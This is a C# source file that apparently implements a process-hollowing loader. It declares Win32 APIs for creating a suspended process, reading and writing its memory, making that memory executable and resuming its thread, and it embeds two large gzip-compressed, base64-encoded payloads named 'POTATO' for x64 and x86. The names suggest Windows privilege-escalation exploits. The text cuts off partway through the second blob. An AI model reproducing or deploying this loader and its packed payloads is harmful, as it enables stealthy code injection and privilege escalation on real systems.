using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace VM8CN
{
    static class Program
    {
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wShowWindow, cbReserved2; public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask;
            public IntPtr BasePriority; public IntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(IntPtr h, int cls, ref PROCESS_BASIC_INFORMATION pbi, int len, out int ret);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr read);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr written);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualProtectEx(IntPtr h, IntPtr addr, IntPtr size, uint newProtect, out uint oldProtect);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit,
            uint flags, IntPtr env, string cwd, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

        internal static readonly string GZ_POTATO_X64 =
            "H4sIAAAAAAAC/6V8C3hbxbXuTguJE8KpgbhVU6C7DS4yEEfPWKiU2nmhXPIQSQiClOI8TGwewU14uJy09fluz6l7Od+pe3tua1oO"
            + "teOEqIYS2ZJs2ZJt+S3LtrwtKZLiGxKTh1HiJJg4xM7D6Z21Zu+tvS2Z7zvfBRJm/WvNmjVrZtY8t5g/ZzDfYJjBsL+lNRbp7hi1"
            + "nc3OzlYQdCHDRGLdV4JXup3B6Z5RFYHSqSC79bWinQWvFhS8XrDXRODvJMOssvMj32DAHenIKqYZg7fqYlKJMgo3xmqPSuFKAi+S"
            + "lzx/28ot6x7e9LyXsBYzTDRcf0TKZpV5arY3XuvKilNbkgX6roU4lEj/SwbzLYZxHrFfdXQ5plilf6ChC+QCnZ5bWQbCvYNhPKFw"
            + "rDce6SB+MP8FvdN9pf6Iv1bAjcVUrrbaMcrLlREkA6yOdADCKiMxrt3+pd/jPpJlI7w04iHngH2A6+r3/gVd21rjvg6Ghvs4Lkag"
            + "f6KQvxY8ae/nLo9Tud54oMbviRxt7fXcSHsPob6peuuAhws0f9YxqnwPK0QNBF3s+u0797624o3XX39tzz4z4Spk3M2v7y3Y/ipp"
            + "n61FBW+VvIcORYahxMCGrwZHW2JHJ9i8bHN2HqlWBRG4jxdQ69n6wIDH39JyrelU96Qo46Vl0LLXrlq7dOuKvA1stMbt7p4k7BHC"
            + "vpeyu8/03ZD1kcaDLSeJCPNfqKEx2BwKXmlr9dzEFvWfsV91ftbdnKVMwdYk2OZk9hLI7RtDdglhL6FsduXre195eI1a9cgatZr8"
            + "0cjLsX61pKTI2FdKSktPez+DuZ+XXKN/ZM3yR9YYWGXdoYauZQPVkcZl7Z7glSzD+zgSWi80fwLWg3AW9D0C30P6zYlId7je3g+N"
            + "w6rYXSte3Ff8Po6R8HDt+f5TXhf0GNvnkev9n/pbygnrbqHFgRE+2Bu3V7XYXH9Fbc8U7dn12lv7WOjzfN+N/ZUfiKFhdhnLXWzt"
            + "jRwk8PhfUdPWvLUbWe/fjjaKjPTKDOabUPrgSSiV5PF4/F9GDtsjhKmqxAHjuVB3rme6/oitLmqDTlCJHU1aeMjee4ZVNtQHDrOZ"
            + "+7KYqgzmLhIj+BEL5kc4kpGtwpr2jDl9jmkpt6pakYYs32dc3B+pP+I56L5ETaz+KDcN24fk6mn3DEw5zx/tcx92dn4/EHR2Upnv"
            + "B+0do0R/cRq2j/sLX1XndWdn5KD/XDTScMPxcd2Bo/b+a87mwfaGZhcRWkCCBjGBzSxiO8Z8aTiie8NNE9EDdZ+OEHIuw/jDoY4I"
            + "N0WI+SQGETzkHzxjTJ+fwcxjmP4rR5vbx4wspQYvhD4glGo+ZgwOgfG587GBXI5INxVmlZ4r/ddsZ7Py52N4cHp8Y57uvtPu6xFX"
            + "oLtUAO1XE2AlAR+CioP/oUJC5WmtodIRzt/T8EWIYzetfmL1hvh8rBp0FGoTswBDDARrMN8ZizQoKMSrQFs3E+hOYivHuaGUukBo"
            + "7HslCzAoQsWhSxCp5gW08ze1X6aZSQwaBov8jaEOZyfor6peeAd2MxBqmgj1Arv/08a/VVUXEcZ3iVdbvNOsSq3R6vTLcwyPsu7L"
            + "SOWtWLlq9Zqq6nKaHYqzH/CHHQH/dHDI/tHgicE7MDD2jMEE4+irD7ttraSESMwfhpCzEFsQsvkP247/80Isq2esxzZwDUyoO9fq"
            + "gJpRux3X28dIJlsik7238YPYQmywhBj1DWi/EwWhwQbO23sNd2IITAgORsLDoQ+CQzBJQJaq6rI7MYh1XgcYemPk4x6bs5N2hKpq"
            + "L1VoG61tMZLhwt1JfUZHLHic6xo8QApOuyuDuY001bnOUxaa9FUN3sinydAHoY7Cu1ARxCcyn52pvAubtq536Fq7n2guMr3tohBI"
            + "BK94IyDVT/P3Hav3xWj+/lG3u7Pa3xy/C7sPFbQfrKpm7pblhvmfvRtzd3U2danuRnEsPdTtjFSZ7kZ1Ha0dY5Eq/3Q+n3ui9jys"
            + "RaCEEirRZ+cuB7vrj5RTDTYHaO6N11srKRA95KuqOwASNpphoM9+ta7PechLVbZ82HHcN10fcH/k6otRCefk0Rv+6YgzfjeGvwbH"
            + "4GUoGHRAwWn3iLYA1NDsb2YpFAp6bnLT0RqQMtxDI8HgYDuQZko299T7gMynGWB0uZo9IWikkgTETXcdqj8SnSy/B0dy95VQB0iA"
            + "Ta2XrVQTELUjnr+77sFI4aztsRlZHyFuJ3W+5JgwcvdgQIHFVsRpvEDFope4KiObtggr5pxsHma3bTatXbPl4ZXrnnyeXSRWDIZ8"
            + "37F2v2ERxqyhkP0YmWFe3WdahEMZabUKEIsE0SBSKEG0iJRIEB0iZRJEj0jFIuy54WGoaevlCAeOgEq6FomBKDwcnegd5KRAKNg7"
            + "GJcDg+1MhizLYLuCAuGD9dbgWVBqoAC24VBdvfsLUwZd1tY2h+qtATcw8jPoyCMOhLUv9Kv521bkrXxyszlv5ernyzIw0jmHg26O"
            + "m7/NtHH96ucrM7DBopeaJii6es+u5yu8WBauAK85vf1fWhMAXTG5vNikVGLwC5+XX2JHOuoCba0gM5KAIj2dx0FqKqFlqLHvy+7J"
            + "9DYR6OgaPEEWYm1oIQDNzvDYstozzklDm6iIO9x4o+FA34CJ5oPphZpjaUNzAICCCmkWIAVzShOQYE55Qgs1pzKhBcyxUWOAFI3x"
            + "JdQIxsRoLt+Hda2wiI5TrZCktk1RPi6wSalp7agBSME2NgEJtqnaRS3Uttx2UQvYZm5H24AUbStMqBFsK2nHEQWLfVjsNNNwQhZr"
            + "sGFQUhKSzkbHVG4zxjaycpuyNPOtW3cIuCXNqBiSsNqDxVt+K/Z9x8XAhJENnGiwOi631sC+o6QVVzL+6tAIicEqTZFR/Ku8FZdT"
            + "M1jWVpxYYfFIV0mpsnJE6NtfITTeioNe5DNerEv4k4FqliS/Rjr9IZWQMHgxsLQd6D/bey2XSvZ96b6wjiZ7B90XLFQ2OlFIE6Fg"
            + "MU1EuBIqRVZLE2VCMhRMa8FhNOCpO93Dud3+2r4DXHt5M26kYK5aQtZasKJnYTpjCeWT81rqgldEnrIIF5BbVyzNe2NX0WvswFT7"
            + "Z11nIh2xXdgp2iZrz/vr7WcH3CO7sNowNFjYqTz3ItKwKPL0c1M/NheiIugJyF9qLtqzm7inpBBn+6PT4eG+ob5Jdq2ZhcURbJIo"
            + "B1YWzacCVyWctJ1YQw9ZhfqnWz6x3fTXcpfZnWKXg3DuOxppMewUOxnIlu6gszIJWBChGk/Vnq/YgZ2S1BqCi5JS/LQd244UzKpt"
            + "k0bLDp6yXyXUOOW1TXbcsHcbmR04AryOsEOw0lhMsc7W2vMiVrIdffL0KjNb39c6bCzbjo0WmWybrNhOq3Sh7pSzGVbDLlKMLRXY"
            + "L2RyX1+0AycsiPnGe2ka9ZpoGso2GnZgmdBuEX9bq9FXhHEZds31Vn9t92TLh/U+6L7Z2hfJRDJehFMLbAkGrE6v87SReQkrEqrz"
            + "3AJXQKcwKqSY/SqbRzDVS1gQdpy1yzYac6kM0nlPWxArfAlbAHeyvF9LX+I9iYq5l+iZBimefWrjZnbA7ukmDV75MtZ5cKQ+bKPJ"
            + "lqn6cCdNui8MXuBe5qNEsKbliGu0/RUMCc3W4Dl3xOWASQg2ZVXV46+gAc+sWs9GrZ7gUNXgpZJXMWvU0f+RkW2MlUnJ1pq0PbjG"
            + "lO6uhdUiq1yuYwPuLPYNLAw8imcUy1hQS6zOfQO7fN5mstODfuod4QZqz7hu/tsbeJwi1cnFgzWwaoUtGMSMtzAQ9Yw1f8hidtjz"
            + "wbAL1NSej3poB614S/QVnMFEPbUuWHO73qIVsAadwPK9hUEQTmpmSv7vn/ObQFjKwyECRAA4Iqmq5n6Ow5vG+8HzPefiFKBTIwDl"
            + "+/n5suNmxw3YDFful40/XHzsF2dmkPDtp3tYMgPAHAEQ7GH3o5cEpO2iYzRQQ/Cp/RgaYUrpnkz7BV0PXgte6TvOBRS/oDGVyBtM"
            + "aAeEW/d1cPw6E+0rpDleoUkoX7UO67pSzw6eaLhGZndl/Uh9AOqXZVlHtzrELFbkQ0uWUAbUSM6Y2oiR6X+8se/1rQV7d7Br165l"
            + "ldANs9LN6ATQBTQIK82iXwQo14wtF6hx9DUPd3UCFLzScMNixvICNdBYUkbuFnTc+jdeeb1oy/ZiVgkrvyzLloTdIguyFG9J2C1j"
            + "lD6AQxLmA1jdzd+2Rv98xQOoG3xE12im114teN72AE4JMJOyeFIhOcPkHsCB3vdlQxesYjNHHqBbCaAfVWWOS8gcfSaTmSCXqzLT"
            + "JaRelclmyk5PoH3505PcTDwiEzjQNWHSCo1BD+7+sAlkijNxKhZk2ida+xo+C97qa+Z1VGTiXlWqHRYNoAEO2JK50It47iIFdj+u"
            + "p3vYd5RNEG3XHkkQgbOGBNHXaZLkmbYkiPpb+Qki6K6ghP/j+lvhdqtABN3hdpcCO6z/43C7lyZbusLt/TRp6wu3h2my+2S4/ThN"
            + "tl0Lt8dpsq8z3D5Ok77pcPsUTUIhad/GJBTxq8U0wJ8aOAUrJlLTH38H27pnTAhAQpwgvCNfwdPcOzvPci92Qdhxw8SK+y8ScYxs"
            + "6b0Y2QKOo0FnM7BIuIQ8rb2dxwOOto+aQyS3614crJDb3WQ/2zOVyD9yL3ZhyBJwQPeESHEvRhDAgkMQ3FoGODgiVdyHUx2ogYhE"
            + "o2ZClek+tL/ODUdszs7EZp01vV1IeQEHbHmcndQKxwRXBWfS981SN9t9OKzBApqBwtx9OMLAvF4u4AA2HAPeh3XE6E4tDw9D5yQs"
            + "0/38CTWg9FAu/35sNVptgIwl92Pco46E6aH8flRID8cTswbYYLsfR5ncEWhc7H4cQRRhH4PxrDKycDZO/cB8l5ZyorU31OGOOScV"
            + "35XYBv6vqjY8jP5oiHSdqbNygUTVLQ/jgSYw2Cc3s3JmaSIX9JsEI/8z9OJQVfgLWCJASbA0KPkMGxlgWG7goTHwVOcymKWk2tN0"
            + "IaJmIx8PnHJ2Jp2JJ1Y0xJvn0JuwWuAPeHLP0yMoEkthVJjPoy9xMxFy9MFmQrikKDmPvhSKB5HGg1HobhXnE4sbWIQANJbBsGSM"
            + "XuwZqwuEO+HgJMI5O+F4NzQG3a7N0Rwis+0Y2gOHunzGwgv87CrcdnxyQb6cnrqAXpLWEE6jyy6iV8lqTvUi2zHWNIHjcrpntPIi"
            + "FgHLbH6NEb+IgYd0yAN1n9o+x/oDC+rv/RydDRyHrXXYOwINA3k+x67scDRbAefRsrMYXVwng1fKadI5ELxi+gxHqrhzgN4zdQpd"
            + "pNNlq182vc3uJ50s7TRCBkO2RoAUpzGnOmd5tk7AlKfRIZlFAlBBT7ZhAzjQHQ2x9HBgidqbGtfEU+Pa9AMpcZ0hNa7Ppzgsa3lo"
            + "Od7vlCfhOYh7k3B6HzR+ABtw3bJNsMcWzVdUp4I1uSlhbWFKWFeeEta75DCYBObHU8I5ioOpYIPpoHgjx840vnh2nqZidp7WOztP"
            + "F5+dp08/lMwTamWYnZeTPzvPUHoI91x0FyxUrOIQ9kgpprElY1pfMqYbScb0zAcJTDBYmYzlmJMxQzHF6r3REdG+smRMU5mMaV3J"
            + "mI5LxvTjEkywT3E4CcvJTcYMhRRbn70yW8xbfhjjxpOszeG5Keb2JksaRigGC3Oxdow1CdOwyZg2NxnT5Sdj+lKKwV4m0cLJmMaW"
            + "jGl9yZhuJBnTM39DDHYvYhnKZExjTsa0JcmYrjIZ0/v+hqEFsK7wgFUsZzw1rlHUpMS1ualxXWFqXF+ewIcOD9rEcl2pcc1Ialyb"
            + "9mFKXKdKjestH4o7xdaaxphYbmlqXGNNjWu51LhuKjWuZz8ScVevv0Ys15Qa1xSnxrUVqXGdNzWuj3+EowbwiFMsNf3vKVCNIRWq"
            + "zU+F6spSoXrb39EK50Bj3dEvGs6K5cVS4xrm45S4Vpka15lT4/oSike4GeVWpsY1vtS4djw1rlMcSYnrcynuOjmj3MLUuKY8Na51"
            + "pcZ1I6lxfZoNcYpGz4nlqlLjGktqXFuaGtdZU+N6zoYRBE4xEpEiGdOk1yZhWlUypjMnY/piCSbE/opkLMebjBlitbjCzVODMrLg"
            + "n+JpDU8r6iit5WkDT+t42sLTep4uofQKQV8FTwv6XDwt6IvX4cS/+inWdTIx6dkFMMKJYK4IOgdEsNienD2nMkX2HF+K7DlTKbIb"
            + "lI7k7AazIzm7odSBDoUDpsQASsY03mRMO5KM6RhnEqZnKYa3jkIZucmYJj8Z05YmY7rKZEzvdeL+ZeBUXSvcG6nFguKzMDTp9akZ"
            + "WsMsDF3+LAx9mZyhEQu3zcLQxGZhaJmG1AydchaG3tQgbnvZFU9vhp2s+0LwSuFMWINw2UxYi7B1JqxD2DcT1iM8PgNeQYtUuGbA"
            + "tMjcmTAtstCFG0veZNjZlEkQDSJWCaJFxCdBdIjEJYgekbRGEVlBNSslCNVskiBUcyFFcMlMjSqbiWisMxGtbyaii89E9GlNcmSF"
            + "WjkT0ZhmItrCJjwEEboS6+wkGZcR8+FurqIJhwDvvMgk3MB6JZiGx+ISTMtj6e4EpuMxgwTT81h+AlshlFEmwYQybBJMKCPmxupg"
            + "nF7xxj5i5NRMRKPwzEC0hpmIzjIT0cc8eOAAJ15wlztOyXZPpBtILroIj506PbeCQ3A7EZcCcOxUEVuEZ+WOSA37TN7W1Xi+4/rC"
            + "3+yayTCvXM8CgyOMu/gzHUezFZgs6IsTPIPinMM3RjNtWrtmDdt6Lu1YCt6qvC15hKc8hvpkuuxXHRdzjyUMyAM1gmX5MxmCZSXH"
            + "5JYRJmorJ/giSemAr9m4aT0p3JaCxdvFSewSNIFdcYIvpMULFjHDi6DJ0SLBGMWw3Jj1Zi2qUA0n1AoYqC0epmpPJI4cSwmULofg"
            + "UKmSwD9gmIfwH5K/tgUO/TqHHaN17uhpVplZtCyzKIuyH4r/Q9rgo+FhFcO//YJCAxPlCRKeglUyeCoHF5LwXi84BJcf8Jjsez6G"
            + "nvURNOAANFs5R3xFhprmZNAKNFjhjA/r+jUMdZCnzu2/Ehp29MG1mOVr+JpNCoc63IeXCm8S69xHp30NittwfqYv0uAVWmuN32O+"
            + "DQuBW1g44wao5Dbx4hsuxX2DkYM9Yz1wIF95G67PgeP4wHvRHXM54MCY6m24FfiiexIwMD7tdjziTjxMDPk9t5oG6JtD92XL7XiO"
            + "KVxxQPH0mURmke92VAevTUFlnRtOeBVz8ZQtYbtpLnVOMPHkMZ9CwBUuEUrn0mcnpApAcnMlR9Pw9DN3Hn02Q5LQxUDGNY++9SGu"
            + "q70IXRjOEqfoiy14mLUN3v86D7knn2eWYGPAGzpidsBN/sJ7gyViAIEbKlWChGNZ8xIxnhDuxvwECdzSJXhmDGetRlZ0jpXrgvvD"
            + "gAOOvx+sc0ccHOcLNAXqjkUnH/wet0S8/8/LLPIuxWlcyAtH2/DwtntSqcaSgt32aZgpc9X0uQqJWMINmkWN63O8WpPePRWrsaPC"
            + "Azt2GQvvCw0avMZXq9iA28SnNSRtkeD5ErxQgytavJV2VTlPl1Baq+HpMiqLdDlNa0C2gtexnKQrNXiAayDJER0dJz7HtL++djxX"
            + "j3Z7HdEw9J9s4b9CPTYaPnW9MXgAHjY62sr0eLfmP+pspiCw8dnHSlPeFqueXlFHmrqMLFfllZIRLiYlHRPjevoSEcn+mGMibTkC"
            + "MGge7P+UG3pQIQFajtRaHzQb0NSjbnqrIISY7BIDDrm2Y/7aGZyYASvBvyEiIaBx2jExJQWFPpr+qAR0dHX1B4far/seFV9EwZ10"
            + "jJKuOlcPkOM8l3RreC7CGEWy1hU9kG4UX3qBMEtJeCUNpMqIvSIc843x9+W5RpynZXflFpqpt8U+DXihERuebBHo7Ok1is/CoJj0"
            + "H1Kd8PB9GQvr7/KV2E2hFJbkgnsO60rx2lqAvCvRffC23MguVRvYSBv7MPnfrhUxGUe7PMEZl3H0OuSQXrdrRdoqKSdHgxwtPMR/"
            + "ZBW9mThhPzfQkL8K65JZxNLretUa8VUOSzbxUkpnllLafCmlKZZS6vI1qBVeyHS2tnuMVsrtsUWbOm4YXWvQtPDBdg90Z1YZvWQ/"
            + "mFm0L8s4QvNBD4HXHMbxNdIXQ2lPIBVw916q9xkVT+CwIpYH3CrKqfX1x4iciVAPMEz9SOMFiDjs42zvdXsvfeDjPITRLXMfdkNj"
            + "6RNi+3scEN2Mtifog57qSCPEM6OX0vBOOPJx04RxSiy2Yyy2jj7joA9O2Y5oXAJoAJiSAHoA0tYngBw9ARTr5Y9WO6KxLViZtRuW"
            + "kC7AxSVUKDgloaIThqcFKodImiRUKGiRUNGJCpEinYezSqhQ0CWhohM+kdITXkxCRSfiIqUDWyRUdCJtq0BpCU8hoaITSpHSEJ5B"
            + "QkUnTCKlBqslVHSicCv6BnbhfKcrmYloymYi6pgFh6PwfihuwUm6/tLAKfrWovGDzuN0CrY8SyObw1sVcbKtNcZiGdAYM5Y9S69R"
            + "CQCBlsiwStNqS5bROoPRGOMZvmdxPoVPiljg8o+V0p7DbjTYHnQH7ezjjyso/dhjbO8gQCpKYzaY6izPYRxEWrinNRY/x98pwtxX"
            + "KpGAHPhUruI5vHrhs9E7VFYJdmQZvc+hyciDd92i2hGqCW9WxQKnqEHOYVw3Bu1p29DPS1my7kShpaafiM+PoHzrT9DPMA/j2GUH"
            + "T3Jhpb26cTTLN5NVO9I+1j3Z/WGwO/4TfLAwk9Vwo6kr4Fau377z5aKCrPTn6U2GUFWIlun0nZ7nw/ZpdjuNv4HgKXgHWLid/zwF"
            + "YnMxFQsOtdbYduC0BSth1vT2Iyz/KjHLtwMv6enXHWvN+JRQOgPHd9B3rjI+XX2xL8pfZbp203vlSfd1EudIlPHtpjMHuJmQsd30"
            + "KT7/EAyg+G5cjYY+HwqT2aLxuicIqOUlsVdjp9Ua4y+hJtg/9l7LLGJezmAy6XFB06C9F57tg3lwl9pjg/ZTgqQBK2ieXbZpYoas"
            + "ag86ae0GiKufey8KbxJLhC1mpDt6fPAk2etWzEQ0rpmItvT/fgv8o1HpDOzQtdqWtONIq/VkDgO6nKdVZMoCWvHJt6CShkcpu5KS"
            + "OctpbuUJSqqosI2Sy3UqJA0nkdTn0LxeniRLNyBNI9+COUdnUKEmterVfbk6w8umt7M4wsmAS3O1hENv0LNKP51h/6kZ9p+aYf9p"
            + "mcGVp2UGK8/IDLadkRlsOCsz2Ht2NoNNoyio423iRme33/IZFVXTIkYoqTVQewrjlNTTEsd5UkPNKzmHpMZAi2HOU1JPVZXxJF/x"
            + "9DEk1Y9SVRU8uZyqYi9QUkNV2S7IvWq4KPeq96Lcq6ZLMq9yl2RetXwu8+rI5zKvFo7LvDo+PptXS76QeZW5PLtXyy7LvJo+IfNq"
            + "xYTMq+wVmVetV2ReVX0p86rrS5lXc6/KvOq7KvOqeVLm1fFJuddKpmReY67JvFZ2Tea19Osyr1Vcl3mNvTGb16w3ZF5T3Zzda66b"
            + "Mq/lTsu85puWec18S+a12C2Z1/L/IfNa/B8yrxWTLbvEa1M8yXutdI5C6rW0rylgwcEHnHJKLaeKVF9XyDzq+rpC6tHc2xRSj/oo"
            + "KXjUfLtC6tEYT/IezZ+rmMWj8bkKqUeL5ylm9ejUPIXUo6VpCqlH0+YrpB4t50neo4oFCqlHK3mS96jyDoXUo7Y7ZB41LJR51LtQ"
            + "5lHTnVKPcndKPTryTwpYgsBUCo/G4fyKru0Lv6GAJQgw/NGhKgp6Fykki0FThkKyUOREChaRlm8qJAvMEZGCxWfhtxSShem4SMGi"
            + "tUShkCxomW8rJIvdMgkVCqYvVkgWyRUSKhRkv6OQLK7N9yskC++YhAoF87+rkCzYy7+vkCzmFUsUkoV+pYSKcNwPFInJ3+m1PYxk"
            + "99EBK37N94gCv7LDrY2XEPi0zeWggGmpCNDvYLilKA7fwbB5luwEsYJRK2Cx1HyV1F5Ikqpr+GSEq9CgdPNVdt2a1ayWJ+ADGWuC"
            + "CAVVuhkDh9JiwM/VI61V5fCBjdI6Fd9pzMuRJoOFH/6UXq7WUX35OdhbctTLDdhbB7o9V7MYA4Kk+yOmLSEdMquMgjm8oLaE9PCs"
            + "9Efl5lUQ+ht0/uGlSMlZrFFutJXQ6dRooQCiIEv1Q7ntrh/Kbc99DLOB7YIJRGOW7zF5FWA4ZJl/hHkNwkCL/QibDsqhyvIfV8Dq"
            + "TK0h45bXBgVnxR+ngjotP4UW/5gCy4VokJ6rEM4oYBmtWoEkJGGbwBGSLLAbj5MF30Tt+Y6bbZeyi1eiCKxV/aEBzxQl4aCpe5JV"
            + "l66Skpq01VJSWy4jdWXPKoTPd+FUZNU2hfAaEvb/MUrCT1oAyTzPC9uvgvB/UhJ+c6Ku0X7I81NKXnJMROOdn5pfQNIxNWCtG2lz"
            + "nHlBprkkX0HPjez4QfDC7bKCXNsViS8gXt/J5wzhp4dpu5AH70VqfaoC5NErf+dAp5SMcJYXJaTr5AUpGT1X+kdsCGhe/oH0XxTi"
            + "aaDlPYV4SjjyHnYIemOppCM1q/C/ENRRsK8Tl+jjBCTL7OUU1Gers0reR8RAkRyClP90MZ40VzV12c7CNXMsH4EIJwDszsVgp/0g"
            + "JQsLkGw4Gjjc0Oo5Y9uNZIRz+oCcKloM7nBMAJH7ymKIB46J/ptle3jc+0V/B1eMeL1jyKrYtxiil6+v99rS+v78NxJUhLO+laDs"
            + "B8d/jhq4qub+/g7DfiQiHBClv+R1A+ErRXv6z4am7VWsOv1/SkmN5V+lpLbyN4thGLWc9kbqWkn58d8im9IRTvXvUrb9YMl/INv3"
            + "adMAfE3tLRdJqGLaH0QSDDH/HyS5qsbjDZ/1HKv4E+8nSo68i6RjgpKuysXQLk9sf2X77u0suNlULXVFZU4Gs4aZ8/QLE39iyQ5N"
            + "xeiYImYppjSyFMv8xwZWpK4WCKm5m4RU8OeMAZVlMvuY/39lpkdhzzsnkWUp+fP227+uaHmn7FE4RpjBMj7z2ovMj+HXMuZ8stGy"
            + "bfML6zexzGrmKcJqeWfPr7IZ+Df+Y7irnVO56Re/S2ammeAQYs788nM7Lr05r/A3BVc3PPrsyFp44C1RuZLRE8D8x9U/LdyayDvy"
            + "JHxFxitOLZK7AcsWNE2+OrAlwbRtxCpBfjkjdxMqFnItfrZ5h+7Zqz89+buEyPhmuCLCvKnYim1wviGpwXpmLbOK/GEZ9sXbfkKF"
            + "mJ+g56j9qQTMO2do2cqsYPKYDURo/e9FY3dJtKQSGC/EagpazhZEX6AM76twbDEHGnKkABrUvAcrNVJw9JXNO5gX/vC7gqda3pn3"
            + "rBF71j7GuwedmcdsJnZuZIzYkPOefWj3si3WTVN70Nb/tYNlBAGWAQ1zN63//bFfLi7fXG5kzK9lMEpmzsItBS9D7n99Kl7+ww1X"
            + "C/76nyyBDQQBsef+7eSOP/zu+lNZjPe1GfZcl9mTVgwHvqTIH+a3/pIWA4WrGbkJ158yMqZi7GZDbz6yBQqHxjIypRQECciRSbq1"
            + "kbEVo1MAhM5kZEaK4WRvzlYiQTVS66eK4YRpTuaGxwrTfobJ8O5/36L4Gar85rPxclPBe7vBKCOT+zNUObR5TjlLrDMyhVJAQ4By"
            + "mg38AdlgNBgZLwXXk66xmhR7z6/qSEVGfoYjVMnE3j/4DjhCjQNSx2Qx7F5s5wRLT5gawsjdC8dPc54kPhHU5O9FC8D1FCjbi7VM"
            + "+I3Crr1ogwD3/D6n8Df7RvZiP4B2knr6n/e/84yRMezDHH98dz5pWipvZIr3YY5nSA9fz3eLC3vzN3/vpW+8QMrYh7ZkvBDYRYEp"
            + "qmIzqfY6Ig2NRvS+Dgdhc6w7zdtAqpiSwZ20g5UT0kDCyE7gr98EBSzbonwD2NC1MjFiCZ1LavTP/mzdRFy3HwPOxJ9if4ZYx0qC"
            + "5uhmyzbjBjpg8veLkSxZlHkXdUBI/Codue+KQQtEpWJLN/z6TcgaexeLeWg3CN3Y8PRGiIos8z3819aCY6Kx+MZT0E3+5bd/3/V4"
            + "wa/fnPjT7ytALM0ruul9i/9Na5c49qH2iQAV6xJjn5xRcYov/Jc7VJuknoKRZ8HPSjBaC8GBPQvHrmSMgidNZ7Ep+97evHHcAhKF"
            + "Z7FbJQAW26LyLDYXGA3N8xaznXmTeYQU8ipTzGgxtYOgL2JqO8nwIs/VESqLuXcUs3f/lmaHzEVidh2feo1X+RZJbxdTb5LsFaNo"
            + "VCEZbZD9IVLrhwjsGhUrJ3iz9JwsdCa85DqHXRTcJ5mPzolNC+CbP215x7gBYmNCZOofi+Aj5cQDjKrqBfD1UbAGfqSm72Z1650M"
            + "nsrLwVwGr7bgNUWgprbFfR1utuDFxIIF8I0zvEDw+7vOdE9WVb/K4EXETDh3TgapIhYMH9wFL9irF4CC0Bh8u8aa2PYx+La3zu0Z"
            + "9X2SnZ399Bz8QvurRGxE5Ef8G5AT3OEFqA++OEyZgVSUftMI38vRlxRERwfRoaU6/ps5v/41vE1MwakknB8IdjVYw8PgMDhiSKXG"
            + "P6sa12142Q4qmj+ERxaOUd8YfVlBuOrbMR/8ihP8nhfscUCGcH5+O/0MmeSDRyn0ZUlV9bu344+K9YzBXoPdsm6zOlu9TJ2twecj"
            + "cFtkmEtvNg66L1XMxa90fbW9x2h2+kHbAtAJ7yeGzkUO/n2u+MBGgMbnYsXh+3awhf4kGPxszQKfu2nCedo9Ccptjq5DxMxvz8MK"
            + "pODkE042fVfCjQXD8Atj7IOPP8i21gw0LBBem4Q+CNSw338cyMe+TzL9Zh4+mZmNzc2DiT+lM7F54aENvPrxWQdPEPGr8/A6IglX"
            + "LcggITDpR6yICumPe1VXVRK5ZZAf2kX4ZTAi9dU/7jVOtdNctB/weeS/9ZV7RwaJMvzPotXGuDFSV3w2AoP5q38AzEayPiz/AbDG"
            + "6foRknHBLL/9xS7MYJ6gOdrHoJXhuUTCZ8TwbgfnEB4nkQygSfrDYLIfBTMRbctFx/43M/sWYhduPDxYV121IMUviaXfmcE8SEce"
            + "PPqCl2JEcLZfEctPKT3bj4qla/HODW8rYVCUa7H/u69F8TXBI2zmvnL6Yyn88x/39cJCFCkqflMn3NxV7MGLZjYyCXdz/w8sgeob"
            + "TlQAAA==";
        internal static readonly string GZ_POTATO_X86 =
            "H4sIAAAAAAAC/6V7e1hUV5bvca6dkBm7m7SkhmTsuUcjscogFvWASrU3nxp1cNoHUaIkIRGNGOiQaAdiiNfpdr7xzjATvwn9tbfb"
            + "7qG7QTHhGicW1CkeVvF+FQUURVVRVTpES4OKAQ1aCCjgvXutfU7VOVVF/3OTaPb6rbXXXnvttdd+nF1FZYuZv2QYe7vlsXOg3lc1"
            + "eEIMcPebzsnLFzM/IgDnOcfuXrdrI+uc6DTV3bM1bAhnpL+ylQVGFmE8TRhXais5rqESmCzoKyT4MxR3cNZRWmnH5k2b2KbbJ6Px"
            + "NqzLWEd4HNUn0WWc5O70igxYB2oEy0bCGYJlzGmpZYSJ2uIJHidqHfBN23dsJY3rorB4uzJPh+wSNIFdhwi+iDYvWFRMoO/zFgnG"
            + "lIYZszVdjSo4kVoBA7XjvNor7Lqdm7ezXXM1F5gzi5lYKcTdsQdYAr/AMCvxH1K/qtF80Xij/TJ3s9rs/YaVJ+StTshTUPZKf4d4"
            + "wG+6L7Odi5kYhjFZoFF74GiI7PvW2F1MyMUM46q2PPbU2TudA1VnuJvG7vrPlxoI568YBlA7B2hSTBdf1ToKmnK7+A7UVlpcbh+0"
